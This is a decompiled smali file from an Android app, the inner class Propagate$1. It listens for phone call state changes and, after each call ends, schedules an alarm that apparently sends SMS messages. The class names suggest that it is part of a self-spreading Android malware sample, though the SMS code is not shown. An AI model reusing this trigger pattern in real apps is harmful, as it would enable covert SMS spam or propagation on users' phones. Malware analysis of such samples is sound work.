.class Landroid/ares/Propagate$1;
.super Landroid/telephony/PhoneStateListener;
.source "Propagate.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Landroid/ares/Propagate;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Landroid/ares/Propagate;


# direct methods
.method constructor <init>(Landroid/ares/Propagate;)V
    .registers 2

    .prologue
    .line 1
    iput-object p1, p0, Landroid/ares/Propagate$1;->this$0:Landroid/ares/Propagate;

    .line 36
    invoke-direct {p0}, Landroid/telephony/PhoneStateListener;-><init>()V

    return-void
.end method


# virtual methods
.method public onCallStateChanged(ILjava/lang/String;)V
    .registers 5
    .param p1, "state"    # I
    .param p2, "incomingNumber"    # Ljava/lang/String;

    .prologue
    .line 39
    invoke-static {}, Landroid/ares/Propagate;->getLastState()I

    move-result v0

    const/4 v1, 0x2

    if-ne v0, v1, :cond_12

    .line 40
    if-nez p1, :cond_12

    .line 42
    iget-object v0, p0, Landroid/ares/Propagate$1;->this$0:Landroid/ares/Propagate;

    invoke-virtual {v0}, Landroid/ares/Propagate;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Landroid/ares/Propagate;->setSendSMSAlarm(Landroid/content/Context;)V

    .line 45
    :cond_12
    invoke-static {p1}, Landroid/ares/Propagate;->setLastState(I)V

    .line 46
    return-void
.end method
